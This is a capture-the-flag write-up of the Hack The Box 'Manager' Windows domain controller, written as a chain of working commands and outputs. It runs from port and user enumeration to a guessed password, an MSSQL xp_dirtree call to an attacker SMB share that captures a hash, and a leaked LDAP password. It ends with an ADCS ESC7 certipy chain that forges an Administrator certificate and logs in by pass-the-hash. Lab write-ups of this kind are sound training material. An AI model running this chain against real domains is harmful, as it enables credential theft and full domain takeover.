# Manager Write-Up - HTB

## Recon

### Initial Port Scan

```bash
sudo nmap -sS -Pn -n -p- 10.10.11.236 -oN all_syn.txt
```

**Open Ports:**

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49693/tcp open  unknown
49724/tcp open  unknown
49795/tcp open  unknown
50983/tcp open  unknown
```

### Service Enumeration

```bash
PORTS=$(grep "open" all_syn.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -p $PORTS -Pn -n 10.10.11.236
```

```
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-14 00:03:10Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-05-14T00:04:40+00:00; +7h00m02s from scanner time.
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-05-14T00:04:39+00:00; +7h00m03s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-05-14T00:04:40+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-12T09:10:21
|_Not valid after:  2055-05-12T09:10:21
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-05-14T00:04:40+00:00; +7h00m02s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-14T00:04:39+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49689/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open     msrpc         Microsoft Windows RPC
49693/tcp open     msrpc         Microsoft Windows RPC
49724/tcp open     msrpc         Microsoft Windows RPC
49795/tcp open     msrpc         Microsoft Windows RPC
50983/tcp filtered unknown
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Service Details

**DNS (53/tcp):**

* Simple DNS Plus

**HTTP (80/tcp):**

* Microsoft IIS httpd 10.0
* Potentially risky methods: TRACE
* Title: Manager

**Kerberos (88/tcp):**

* Microsoft Windows Kerberos

**LDAP (389/tcp):**

* Microsoft Windows Active Directory LDAP
* Domain: manager.htb
* Site: Default-First-Site-Name
* SSL Certificate:
  * Subject Alternative Name: DNS:dc01.manager.htb
  * Valid from: 2024-08-30T17:08:51
  * Valid until: 2122-07-27T10:31:04

**MSSQL (1433/tcp):**

* Microsoft SQL Server 2019 RTM (15.00.2000.00)
* Target\_Name: MANAGER
* NetBIOS\_Domain\_Name: MANAGER
* NetBIOS\_Computer\_Name: DC01
* DNS\_Domain\_Name: manager.htb
* DNS\_Computer\_Name: dc01.manager.htb
* DNS\_Tree\_Name: manager.htb
* Product\_Version: 10.0.17763

**WinRM (5985/tcp):**

* Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

**Host Information:**

* Host: DC01
* OS: Windows
* SMB message signing: enabled and required
* Clock skew: mean: 7h00m02s

### LDAP Enumeration

```bash
bashldapsearch -x -H ldap://manager.htb -b "" -s base
```

**Results:**

* domainFunctionality: 7
* forestFunctionality: 7
* domainControllerFunctionality: 7
* rootDomainNamingContext: DC=manager,DC=htb
* ldapServiceName: manager.htb:dc01$@MANAGER.HTB
* isGlobalCatalogReady: TRUE
* namingContexts:
  * DC=manager,DC=htb
  * CN=Configuration,DC=manager,DC=htb
  * CN=Schema,CN=Configuration,DC=manager,DC=htb
  * DC=DomainDnsZones,DC=manager,DC=htb
  * DC=ForestDnsZones,DC=manager,DC=htb
* dnsHostName: dc01.manager.htb

### Web Enumeration

#### Directory Scan

```bash
feroxbuster -u http://manager.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -d 3 -t 100
```

**Findings:**

* Standard web content directories:
  * /images/
  * /css/
  * /js/
* Main pages:
  * index.html
  * about.html
  * contact.html
  * service.html
* No admin pages or login portals discovered

#### Virtual Host Fuzzing

```bash
gobuster vhost -u http://manager.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 50
```

**Results:**

* No additional vhosts discovered

### User Enumeration

kerbrute:

**Valid Users:**

* ryan/Ryan
* guest/Guest
* cheng/Cheng
* raven/Raven
* administrator/Administrator
* operator
* jinwoo

### Domain Information

**Domain SID:** S-1-5-21-4078382237-1492182817-2568127209



impacket-looksupid:

```
impacket-lookupsid manager.htb/guest@10.10.11.236
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at 10.10.11.236
[*] StringBinding ncacn_np:10.10.11.236[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: MANAGER\Administrator (SidTypeUser)
501: MANAGER\Guest (SidTypeUser)
502: MANAGER\krbtgt (SidTypeUser)
512: MANAGER\Domain Admins (SidTypeGroup)
513: MANAGER\Domain Users (SidTypeGroup)
514: MANAGER\Domain Guests (SidTypeGroup)
515: MANAGER\Domain Computers (SidTypeGroup)
516: MANAGER\Domain Controllers (SidTypeGroup)
517: MANAGER\Cert Publishers (SidTypeAlias)
518: MANAGER\Schema Admins (SidTypeGroup)
519: MANAGER\Enterprise Admins (SidTypeGroup)
520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
525: MANAGER\Protected Users (SidTypeGroup)
526: MANAGER\Key Admins (SidTypeGroup)
527: MANAGER\Enterprise Key Admins (SidTypeGroup)
553: MANAGER\RAS and IAS Servers (SidTypeAlias)
571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
1000: MANAGER\DC01$ (SidTypeUser)
1101: MANAGER\DnsAdmins (SidTypeAlias)
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
1113: MANAGER\Zhong (SidTypeUser)
1114: MANAGER\Cheng (SidTypeUser)
1115: MANAGER\Ryan (SidTypeUser)
1116: MANAGER\Raven (SidTypeUser)
1117: MANAGER\JinWoo (SidTypeUser)
1118: MANAGER\ChinHae (SidTypeUser)
1119: MANAGER\Operator (SidTypeUser)

```

It seems that operator uses weak password:

```
crackmapexec smb 10.10.11.236 -u "Operator" -p "operator"
```

## Foothold

It seems this works:

```
impacket-mssqlclient manager.htb/Operator:operator@10.10.11.236 -windows-auth


Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 

```

```
EXEC master..xp_dirtree '\\10.10.16.9\share'
```

Responder caught:

<pre data-overflow="wrap"><code>[SMB] NTLMv2-SSP Client   : 10.10.11.236
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
<strong>[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:e271f8665fcae80f:13B45D7B68B0891E1B3428357467FAC0:0101000000000000805E423945C4DB0165CF76562D2E4F3D0000000002000800530044004600560001001E00570049004E002D004700560053003700590051003100510034003300350004003400570049004E002D00470056005300370059005100310051003400330035002E0053004400460056002E004C004F00430041004C000300140053004400460056002E004C004F00430041004C000500140053004400460056002E004C004F00430041004C0007000800805E423945C4DB010600040002000000080030003000000000000000000000000030000002CE6A6CC52B8580D650A7F4C2DA869B74B8BCFB1718D5C1EB8A6D070DE30D070A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0039000000000000000000
</strong></code></pre>

no use though.

Enumerated the file system with xp\_dirtree:

```
SQL (MANAGER\Operator  guest@tempdb)> EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1 
```

Downloaded the backup

```
http://manager.htb/website-backup-27-07-23-old.zip
```

```
ldap-conf>
<server>
<host>dc01.manager.htb</host>
<open-port enabled="true">389</open-port>
<secure-port enabled="false">0</secure-port>
<search-base>dc=manager,dc=htb</search-base>
<server-type>microsoft</server-type>
<access-user>
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
</access-user>
<uid-attribute>cn</uid-attribute>
</server>
<search type="full">
</search>
</ldap-conf>
```

raven:R4v3nBe5tD3veloP3r!123

## PrivEsc

Enumerated the system, but remember that this is related to ADCS based on our nmaps:

```
home/czr/.local/bin/certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236
```

```
"[!] Vulnerabilities": {
        "ESC7": "'MANAGER.HTB\\\\Raven' has dangerous permissions"

```

After some googling, let's do the chain:

```
/home/czr/.local/bin/certipy ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -target 10.10.11.236 -add-officer raven          
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

```
/home/czr/.local/bin/certipy ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123' -target 10.10.11.236 -enable-template SubCA -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to get DCOM connection for: 10.10.11.236
[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.236:636 - ssl
[+] Default path: DC=manager,DC=htb
[+] Configuration path: CN=Configuration,DC=manager,DC=htb
[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
```

```
/home/czr/.local/bin/certipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -template SubCA -target dc01.manager.htb -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 26
Would you like to save the private key? (y/N) y
[*] Saved private key to 26.key
[-] Failed to request certificate
                                 
```

```
/home/czr/.local/bin/certipy ca -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -issue-request 26                  
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate

```

Retrieve it now:

```
 /home/czr/.local/bin/certipy req -ca manager-DC01-CA -dc-ip 10.10.11.236 -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -target dc01.manager.htb -retrieve 26           
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 26
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '26.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

Tried to get the TGT, but clock skews are too great:

```
/home/czr/.local/bin/certipy auth -pfx administrator.pfx -domain manager.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

I am syncing it:

```
sudo ntpdate -q 10.10.11.236    
[sudo] password for czr: 
2025-05-14 04:41:53.176290 (+0300) +25202.341037 +/- 0.019232 10.10.11.236 s1 no-leap
```

```
sudo date -s "2025-05-14 04:42:00"
Wed May 14 04:42:00 EEST 2025
```

Trying again:

```
/home/czr/.local/bin/certipy auth -pfx administrator.pfx -domain manager.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

```

Got in:

```
evil-winrm -i 10.10.11.236 -u Administrator -H ae5064c2f62317332c88629e025924ef
```
